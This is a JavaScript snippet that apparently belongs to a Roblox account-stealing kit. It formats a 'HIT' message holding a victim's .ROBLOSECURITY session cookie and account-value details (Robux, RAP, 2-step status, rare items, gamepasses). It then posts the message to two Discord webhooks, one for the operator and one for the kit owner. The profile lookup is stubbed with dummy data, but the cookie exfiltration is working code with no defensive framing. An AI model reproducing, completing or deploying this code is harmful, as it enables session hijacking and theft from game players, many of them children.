// Example function to build and send a HIT embed to both owner and user webhook
async function sendRobloxHitEmbed({cookie, personWebhook, ownerWebhook}) {
  // Simulate fetchRobloxProfile(cookie): in production, use Roblox APIs on backend!
  async function fetchRobloxProfile(cookie) {
    // --- Replace this with real HTTP requests using the cookie! ---
    // Example dummy data:
    return {
      username: "Dramskof",
      userId: 12345678,
      avatar: "https://www.roblox.com/headshot-thumbnail/image?userId=12345678&width=150&height=150&format=png",
      accountCountry: "Serbia",
      accountAge: 1177,
      created: "2021-04-09T20:15:00Z",
      robux: 0,
      premium: false,
      twoStepEnabled: false,
      emailVerified: true,
      groupsOwned: 0,
      rap: 0,
      summary: "No special activity.",
      credit: 0,
      convert: 0,
      payments: 0,
      korblox: false,
      headless: false,
      playedMM2: true,
      mm2Gamepasses: "Elite, Radio",
      playedGrowAGarden: true,
      gagGamepasses: "VIP",
    };
  }

  // Build the embed
  const info = await fetchRobloxProfile(cookie);

  const embed = {
    "embeds": [{
      "title": `${info.username} | Roblox`,
      "description": [
        `\`\`\`\n.Cookie: ${cookie}\n\`\`\``,
        `**👤 Username:** ${info.username}`,
        `**🖼️ Avatar:** [View](https://www.roblox.com/users/${info.userId}/profile)`,
        `**🌍 Location:** ${info.accountCountry}`,
        `**📅 Account Age:** ${info.accountAge} days`,
        `**🆔 UserID:** ${info.userId}`,
        ``,
        `**💰 Robux:** ${info.robux}`,
        `**💼 Premium:** ${info.premium ? "Yes" : "No"}`,
        `**🔒 2-Step Enabled:** ${info.twoStepEnabled ? "Yes" : "No"}`,
        `**📧 Email Verified:** ${info.emailVerified ? "Yes" : "No"}`,
        ``,
        `**🧑‍🤝‍🧑 Groups Owned:** ${info.groupsOwned}`,
        `**🎁 RAP (Recent Average Price):** ${info.rap}`,
        `**🔎 Summary:** ${info.summary}`,
        `**💳 Credit:** ${info.credit}`,
        `**💱 Convert:** ${info.convert}`,
        `**💸 Payments:** ${info.payments}`,
        ``,
        `**🦴 Korblox:** ${info.korblox ? "Yes" : "No"}`,
        `**🎃 Headless:** ${info.headless ? "Yes" : "No"}`,
        ``,
        `**🎮 Games Played:**`,
        `MM2: ${info.playedMM2 ? "Yes" : "No"}${info.mm2Gamepasses ? ` | Gamepasses: ${info.mm2Gamepasses}` : ""}`,
        `Grow a Garden: ${info.playedGrowAGarden ? "Yes" : "No"}${info.gagGamepasses ? ` | Gamepasses: ${info.gagGamepasses}` : ""}`,
      ].join('\n'),
      "thumbnail": {
        "url": info.avatar
      },
      "color": 15548997
    }]
  };

  // Send to both webhooks
  for (const webhook of [personWebhook, ownerWebhook]) {
    await fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(embed)
    });
  }
}

// Usage Example:
sendRobloxHitEmbed({
  cookie: "YOUR_ROBLOSECURITY_COOKIE_HERE",
  personWebhook: "https://discord.com/api/webhooks/XXXXXXXXX/xxxxxxxxxxxxxxxxxxxxxxx",
  ownerWebhook: "https://discord.com/api/webhooks/YYYYYYYYY/yyyyyyyyyyyyyyyyyyyyyyy"
});